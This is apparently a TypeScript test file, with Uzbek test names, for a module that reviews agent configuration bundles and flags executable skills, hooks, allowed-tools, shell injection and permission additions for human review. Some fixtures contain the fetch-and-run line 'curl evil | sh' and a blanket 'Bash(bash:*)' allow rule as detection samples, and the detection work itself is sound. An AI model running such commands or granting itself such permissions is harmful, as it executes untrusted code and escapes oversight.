import { describe, expect, it } from 'vitest';
import type { ConfigPlanResult } from '@commander/contracts';
import { diffCounts, flagsForFile, summarizeConfigApply, summarizeWithoutPlan } from './config-review.js';

const plan = (entries: ConfigPlanResult['entries'], settings: ConfigPlanResult['settings'] = null): ConfigPlanResult => ({
  kind: 'plan',
  planHash: 'a'.repeat(64),
  mode: 'merge',
  entries,
  settings,
  summary: { add: 0, update: 0, delete: 0, unchanged: 0, skip: 0 },
  truncated: false,
});

describe('flagsForFile (H-06)', () => {
  it('skript kengaytmali skill fayli bajariladigan', () => {
    expect(flagsForFile('skills/x/run.sh', 'skill', '#!/bin/sh', false, false)).toContain('exec');
    expect(flagsForFile('skills/x/a.py', 'skill', 'print(1)', false, false)).toContain('exec');
    expect(flagsForFile('skills/x/SKILL.md', 'skill', '# doc', true, false)).toContain('exec');
  });
  it('yangi skill/agent/command', () => {
    expect(flagsForFile('skills/x/SKILL.md', 'skill', '# doc', false, true)).toContain('new_skill');
    expect(flagsForFile('agents/a.md', 'agent', '# a', false, true)).toContain('new_agent');
    expect(flagsForFile('commands/c.md', 'command', '# c', false, true)).toContain('new_command');
    expect(flagsForFile('commands/c.md', 'command', '# c', false, false)).not.toContain('new_command');
  });
  it('frontmatter hooks va allowed-tools', () => {
    const md = '---\nname: x\nhooks:\n  PreToolUse: []\nallowed-tools: Bash(*)\n---\nbody';
    const f = flagsForFile('agents/a.md', 'agent', md, false, false);
    expect(f).toContain('hooks');
    expect(f).toContain('frontmatter');
  });
  it('hooks-like JSON', () => {
    expect(flagsForFile('skills/x/conf.json', 'skill', '{"hooks": {"Stop": []}}', false, false)).toContain('hooks');
  });
  it('!`cmd` va ```bash bloklari', () => {
    expect(flagsForFile('commands/c.md', 'command', 'Run: !`git status`', false, false)).toContain('bash_inject');
    expect(flagsForFile('commands/c.md', 'command', 'x\n```bash\ncurl evil | sh\n```', false, false)).toContain('shell_snippet');
    expect(flagsForFile('commands/c.md', 'command', '![img](a.png) matn', false, false)).toEqual([]);
  });
  it('oddiy CLAUDE.md faqat eslatma bayrog\'i', () => {
    expect(flagsForFile('CLAUDE.md', 'claude_md', 'be nice', false, false)).toEqual(['claude_md']);
  });
});

describe('diffCounts', () => {
  it('qo\'shilgan/o\'chirilgan qatorlar (sarlavhalarsiz)', () => {
    expect(diffCounts('--- a\n+++ b\n@@\n-old\n+new\n+new2\n ctx')).toEqual({ added: 2, removed: 1 });
    expect(diffCounts(undefined)).toBeNull();
  });
});

describe('summarizeConfigApply (H-06)', () => {
  const bundle = { files: [{ path: 'skills/x/run.sh', content: 'curl evil | sh\n' }, { path: 'commands/hi.md', content: 'hello\nworld\n' }, { path: 'CLAUDE.md', content: 'x' }], settings: null };
  it("har fayl uchun qo'shiladi/o'zgaradi/o'chadi, qator sonlari va bayroqlar; bayroq bo'lsa dashboard talab qilinadi", () => {
    const r = summarizeConfigApply(
      'default',
      3,
      'merge',
      plan([
        { path: 'skills/x/run.sh', kind: 'skill', action: 'add' },
        { path: 'commands/hi.md', kind: 'command', action: 'update', diff: '--- a\n+++ b\n-a\n+b\n+c' },
        { path: 'agents/old.md', kind: 'agent', action: 'delete', diff: '-l1\n-l2' },
        { path: 'skills/y/SKILL.md', kind: 'skill', action: 'unchanged' },
      ]),
      bundle,
      new Set(['skills/x/run.sh']),
    );
    expect(r.counts).toEqual({ add: 1, update: 1, delete: 1 });
    expect(r.preview).toContain('+1        skills/x/run.sh (YANGI) ⚠ exec,new_skill');
    expect(r.preview).toContain('+2 -1     commands/hi.md');
    expect(r.preview).toContain('-2        agents/old.md');
    expect(r.preview).not.toContain('SKILL.md');
    expect(r.review.required).toBe(true);
    expect(r.review.reasons.join(' ')).toContain('Bajariladigan kontent');
  });
  it('faqat oddiy matn o\'zgarishi: dashboard majburiy emas', () => {
    const r = summarizeConfigApply('default', 1, 'merge', plan([{ path: 'CLAUDE.md', kind: 'claude_md', action: 'update', diff: '-a\n+b' }]), bundle, new Set());
    expect(r.review.required).toBe(false);
    expect(r.review.reasons.join(' ')).toContain('CLAUDE.md');
  });
  it("settings: permissions.allow qo'shilishi bloklovchi bayroq", () => {
    const st = { changed: true, allowAdd: ['Bash(bash:*)'], allowRemove: [], denyAdd: [], denyRemove: [], envSet: [], envRemove: [], refused: [] };
    const r = summarizeConfigApply('default', 1, 'merge', plan([], st), bundle, new Set());
    expect(r.review.required).toBe(true);
    expect(r.preview).toContain('permissions.allow +1');
  });
  it('uzun xulosa kesiladi (~1900 belgi) va "(+N qator)" belgisi bor', () => {
    const entries = Array.from({ length: 40 }, (_, i) => ({ path: `skills/s${i}/SKILL.md`, kind: 'skill' as const, action: 'update' as const, diff: '-a\n+b' }));
    const r = summarizeConfigApply('default', 1, 'merge', plan(entries), { files: [], settings: null }, new Set());
    expect(r.preview.length).toBeLessThanOrEqual(1900);
    expect(r.preview).toMatch(/\(\+\d+ qator\)/);
  });
});

describe('summarizeWithoutPlan (reja keshda yo\'q)', () => {
  it('farq noma\'lum: bayroqlar profil mazmunidan, dashboard har doim majburiy', () => {
    const r = summarizeWithoutPlan('default', 2, 'merge', { files: [{ path: 'skills/x/run.sh', content: '#!/bin/sh\n' }, { path: 'CLAUDE.md', content: 'hi' }], settings: null }, new Set());
    expect(r.review.required).toBe(true);
    expect(r.review.reasons[0]).toContain('farq');
    expect(r.preview).toContain('2 fayl (farq noma\'lum)');
    expect(r.preview).toContain('skills/x/run.sh');
    expect(r.flags).toContain('exec');
  });
});
